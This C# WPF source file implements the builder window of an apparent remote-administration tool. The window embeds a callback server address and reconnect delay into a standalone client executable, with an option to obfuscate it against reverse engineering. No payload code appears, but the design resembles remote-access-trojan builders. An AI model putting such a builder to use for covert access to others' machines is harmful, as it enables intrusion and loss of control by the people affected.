using System;
using System.IO;
using System.Windows;
using System.Windows.Controls;
using Microsoft.Win32;
using RemoteAdmin.Server.Build;

namespace RemoteAdmin.Server
{
    public partial class BuilderWindow : Window
    {
        // UI fields for different tabs
        private TextBox txtServerIP, txtServerPort, txtReconnectDelay;
        private CheckBox chkObfuscate;

        public BuilderWindow()
        {
            InitializeComponent();
            // Load the default tab
            LoadConnectionSettings();
        }

        private void SidebarButton_Click(object sender, RoutedEventArgs e)
        {
            // Clear all selected states
            if (btnBasicSettings != null) btnBasicSettings.Tag = null;
            if (btnConnectionSettings != null) btnConnectionSettings.Tag = null;
            if (btnInstallationSettings != null) btnInstallationSettings.Tag = null;
            if (btnAssemblySettings != null) btnAssemblySettings.Tag = null;

            var button = sender as Button;
            if (button != null) button.Tag = "Selected";

            // Load the appropriate settings page
            if (button == btnBasicSettings) LoadBasicSettings();
            else if (button == btnConnectionSettings) LoadConnectionSettings();
            else if (button == btnInstallationSettings) LoadInstallationSettings();
            else if (button == btnAssemblySettings) LoadAssemblySettings();
        }

        private void LoadBasicSettings()
        {
            contentArea.Children.Clear();
            var panel = new StackPanel();

            panel.Children.Add(CreateHeader("Basic Settings"));
            panel.Children.Add(CreateLabel("These settings will be available in future versions."));

            contentArea.Children.Add(panel);
        }

        private void LoadConnectionSettings()
        {
            contentArea.Children.Clear();
            var panel = new StackPanel();

            panel.Children.Add(CreateHeader("Connection Settings"));

            panel.Children.Add(CreateLabel("Server IP Address:"));
            txtServerIP = CreateTextBox("127.0.0.1");
            panel.Children.Add(txtServerIP);
            panel.Children.Add(CreateSpacer());

            panel.Children.Add(CreateLabel("Server Port:"));
            txtServerPort = CreateTextBox("5900");
            panel.Children.Add(txtServerPort);
            panel.Children.Add(CreateSpacer());

            panel.Children.Add(CreateLabel("Reconnect Delay (seconds):"));
            txtReconnectDelay = CreateTextBox("30");
            panel.Children.Add(txtReconnectDelay);
            panel.Children.Add(CreateSpacer());

            panel.Children.Add(CreateHeader("Advanced"));
            chkObfuscate = new CheckBox
            {
                Content = "Enable Obfuscation",
                Margin = new Thickness(0, 10, 0, 0)
            };
            panel.Children.Add(chkObfuscate);

            var hint = new TextBlock
            {
                Text = "Obfuscation makes reverse engineering harder but increases build time",
                FontSize = 10,
                Foreground = System.Windows.Media.Brushes.Gray,
                Margin = new Thickness(20, 5, 0, 0),
                TextWrapping = TextWrapping.Wrap
            };
            panel.Children.Add(hint);

            contentArea.Children.Add(panel);
        }

        private void LoadInstallationSettings()
        {
            contentArea.Children.Clear();
            var panel = new StackPanel();

            panel.Children.Add(CreateHeader("Installation Settings"));
            panel.Children.Add(CreateLabel("Installation features will be available in future versions."));

            contentArea.Children.Add(panel);
        }

        private void LoadAssemblySettings()
        {
            contentArea.Children.Clear();
            var panel = new StackPanel();

            panel.Children.Add(CreateHeader("Assembly Settings"));
            panel.Children.Add(CreateLabel("Assembly customization will be available in future versions."));

            contentArea.Children.Add(panel);
        }

        private async void BuildClient_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                // Make sure we have the connection settings loaded
                if (txtServerIP == null || txtServerPort == null || txtReconnectDelay == null)
                {
                    MessageBox.Show("Please go to Connection Settings first.", "Settings Required",
                        MessageBoxButton.OK, MessageBoxImage.Warning);
                    return;
                }

                // Validate inputs
                if (string.IsNullOrWhiteSpace(txtServerIP.Text))
                {
                    MessageBox.Show("Please enter a server IP address.", "Validation Error",
                        MessageBoxButton.OK, MessageBoxImage.Warning);
                    return;
                }

                if (!int.TryParse(txtServerPort.Text, out int port) || port < 1 || port > 65535)
                {
                    MessageBox.Show("Please enter a valid port (1-65535).", "Validation Error",
                        MessageBoxButton.OK, MessageBoxImage.Warning);
                    return;
                }

                if (!int.TryParse(txtReconnectDelay.Text, out int delay) || delay < 1)
                {
                    MessageBox.Show("Please enter a valid reconnect delay (seconds).", "Validation Error",
                        MessageBoxButton.OK, MessageBoxImage.Warning);
                    return;
                }

                // Find the client template
                string templatePath = FindClientTemplate();
                if (templatePath == null)
                {
                    MessageBox.Show(
                        "Client template not found!\n\n" +
                        "Please build the RemoteAdmin.Client project first:\n\n" +
                        "1. Right-click RemoteAdmin.Client in Solution Explorer\n" +
                        "2. Click 'Build'\n" +
                        "3. Wait for build to complete\n" +
                        "4. Try building the client again\n\n" +
                        "The builder looks for:\n" +
                        "  • RemoteAdmin.Client\\bin\\Release\\net8.0\\RemoteAdmin.Client.dll\n" +
                        "  • RemoteAdmin.Client\\bin\\Debug\\net8.0\\RemoteAdmin.Client.dll",
                        "Template Not Found",
                        MessageBoxButton.OK,
                        MessageBoxImage.Warning);
                    return;
                }

                var saveDialog = new SaveFileDialog
                {
                    Filter = "Executable|*.exe",
                    FileName = "RemoteAdmin-Client.exe",
                    Title = "Save Built Client"
                };

                if (saveDialog.ShowDialog() != true)
                    return;

                // Create build options
                var options = new BuildOptions
                {
                    ServerIP = txtServerIP.Text.Trim(),
                    ServerPort = port,
                    ReconnectDelay = delay,
                    Obfuscate = chkObfuscate?.IsChecked ?? false,
                    OutputPath = saveDialog.FileName
                };

                // Show progress
                var progressWindow = new Window
                {
                    Title = "Building Client",
                    Width = 400,
                    Height = 150,
                    WindowStartupLocation = WindowStartupLocation.CenterOwner,
                    Owner = this,
                    ResizeMode = ResizeMode.NoResize,
                    Background = System.Windows.Media.Brushes.Black,
                    Content = new TextBlock
                    {
                        Text = "Building client, please wait...",
                        Foreground = System.Windows.Media.Brushes.White,
                        FontSize = 14,
                        HorizontalAlignment = HorizontalAlignment.Center,
                        VerticalAlignment = VerticalAlignment.Center
                    }
                };

                progressWindow.Show();

                try
                {
                    // Build in background
                    await System.Threading.Tasks.Task.Run(() =>
                    {
                        var builder = new ClientBuilder(options, templatePath);
                        builder.Build();
                    });

                    progressWindow.Close();

                    MessageBox.Show(
                        $"✓ Client built successfully!\n\n" +
                        $"Output: {saveDialog.FileName}\n\n" +
                        $"Configuration:\n" +
                        $"  • Server: {options.ServerIP}:{options.ServerPort}\n" +
                        $"  • Reconnect Delay: {options.ReconnectDelay}s\n" +
                        $"  • Obfuscation: {(options.Obfuscate ? "Enabled" : "Disabled")}\n\n" +
                        $"This is a single executable with all dependencies embedded.\n" +
                        $"Simply copy and run it - no DLL files needed!",
                        "Build Successful",
                        MessageBoxButton.OK,
                        MessageBoxImage.Information);

                    DialogResult = true;
                }
                catch (Exception ex)
                {
                    progressWindow.Close();
                    throw;
                }
            }
            catch (Exception ex)
            {
                // Show detailed error
                string errorMessage = $"Build failed!\n\n" +
                    $"Error: {ex.Message}\n\n";

                if (ex.InnerException != null)
                {
                    errorMessage += $"Inner Error: {ex.InnerException.Message}\n\n";
                }

                errorMessage += $"Stack Trace:\n{ex.StackTrace}";

                MessageBox.Show(errorMessage, "Build Error",
                    MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private string FindClientTemplate()
        {
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
            // prefer client.bin if present
            string binPath = System.IO.Path.Combine(baseDir, "client.bin");
            if (File.Exists(binPath)) return binPath;

            // fallback to previous behavior
            string exePath = System.IO.Path.Combine(baseDir, "RemoteAdmin.Client.exe");
            if (File.Exists(exePath)) return exePath;

            return null;
        }


        private void Cancel_Click(object sender, RoutedEventArgs e)
        {
            DialogResult = false;
        }

        // Helper methods to create UI elements
        private TextBlock CreateHeader(string text)
        {
            return new TextBlock
            {
                Text = text,
                FontSize = 16,
                FontWeight = FontWeights.Bold,
                Margin = new Thickness(0, 0, 0, 15)
            };
        }

        private TextBlock CreateLabel(string text)
        {
            return new TextBlock
            {
                Text = text,
                Margin = new Thickness(0, 0, 0, 5)
            };
        }

        private TextBox CreateTextBox(string defaultValue)
        {
            return new TextBox
            {
                Text = defaultValue,
                Margin = new Thickness(0, 0, 0, 0)
            };
        }

        private FrameworkElement CreateSpacer()
        {
            return new Border { Height = 15 };
        }
    }
}